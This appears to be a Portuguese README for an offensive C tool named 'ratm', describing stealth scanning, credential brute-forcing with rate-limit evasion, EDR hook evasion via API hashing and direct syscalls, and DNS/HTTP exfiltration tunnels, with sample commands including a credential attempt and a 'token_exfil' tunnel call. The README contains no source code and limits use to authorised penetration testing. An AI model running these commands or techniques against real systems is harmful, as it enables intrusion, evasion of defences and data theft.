# RageAgainstTheMachine (ratm)

O `ratm` é uma ferramenta leve e veloz para auditoria de redes internas e operações de Red Team, desenvolvida inteiramente em linguagem C. Projetada para oferecer desempenho máximo e baixo consumo de recursos, a ferramenta utiliza sockets de baixo nível, I/O assíncrono e cabeçalhos de protocolo customizados para operar em ambientes restritos.

---

## Funcionalidades Principais

- **Ghost Discovery (recon):** Varredura stealth baseada em raw sockets para descoberta de hosts com baixo uso de CPU.
- **Adaptive Auth Engine (auth):** Motor de validação de credenciais multithread não-bloqueante com variação estocástica de tempo para evitar bloqueios por taxa de requisição.
- **Hook & Defense Auditor (evasion):** Inspeção de hooks em user-mode, resolução dinâmica de APIs via hash (ROR13) e chamadas diretas de sistema.
- **Protocol Camouflage (tunnel):** Encapsulamento de tráfego via subdomínios DNS e cabeçalhos HTTP customizados para simulação de tráfego legítimo de telemetria.
- **Engenharia em C Puro:** Sem dependências pesadas de runtime externa, footprint mínimo de memória e suporte a compilação estática.

---

## Visao Geral da Arquitetura

```text
RageAgainstTheMachine/
├── include/
│   ├── ratm.h          # Configurações globais e macros
│   ├── recon.h         # Estruturas e protótipos do Ghost Discovery
│   ├── auth.h          # Estruturas do Adaptive Auth Engine
│   ├── evasion.h       # Módulo de auditoria de hooks e API hashing
│   └── tunnel.h        # Módulo de camuflagem de tráfego
├── src/
│   ├── main.c          # Interface CLI e gerenciamento de argumentos
│   ├── recon.c         # Varredura raw sockets assíncrona
│   ├── auth.c          # Autenticação multithread adaptativa
│   ├── evasion.c       # Verificação de hooks e direct syscalls
│   └── tunnel.c        # Túneis DNS e HTTP
├── Makefile            # Script de compilação otimizado (-O3)
└── README.md
````
---

##Compilação

Pré-requisitos
 - GCC ou Clang
 - Make
 - Sistema operacional Linux ou compatível com POSIX
 - Privilégios de root ou CAP_NET_RAW (necessários para raw sockets no módulo de recon)

**Instruções de Build**
Clone o repositório e execute o comando make:

```bash
make
```

Para limpar os objetos intermediários e recompilar do zero:

```bash
make rebuild
```

Para Clang:
```bash
make CC=clang
```

O binário compilado estará disponível no diretório **./bin/ratm.**

---

**Modos de Uso e Exemplos**
Execute o binário sem argumentos para exibir o menu de ajuda:

```bash
./bin/ratm
```

**1. Ghost Discovery (Recon)**
Executa uma varredura TCP SYN assíncrona contra um alvo específico:

```bash
sudo ./bin/ratm recon 192.168.1.50 445
```

**2. Adaptive Auth Engine**
Testa combinações de credenciais utilizando threads não-bloqueantes e intervalo dinâmico:

```bash
./bin/ratm auth 192.168.1.100 445 Administrator Password123
```

**3. Hook & Defense Auditor**
Executa verificações no ambiente local, resolução de hash de API e checagem de hooks:

```bash
./bin/ratm evasion
```

**4. Protocol Camouflage & Tunneling**
Codifica dados para transmissão via consultas DNS ou testa batimentos cardíacos via HTTP:

```bash
# Módulo DNS
./bin/ratm tunnel dns 192.168.1.1 payload_test
```

```bash
# Módulo HTTP
./bin/ratm tunnel http 192.168.1.200 80 token_exfil_xyz
```

---

**Aviso Legal**
Esta ferramenta foi desenvolvida estritamente para testes de penetração autorizados, pesquisas de segurança e operações de Red Team em sistemas onde há permissão prévia e expressa. O uso não autorizado em redes ou sistemas de terceiros é ilegal. Os desenvolvedores não se responsabilizam pelo uso indevido ou por danos causados pelo uso deste software.

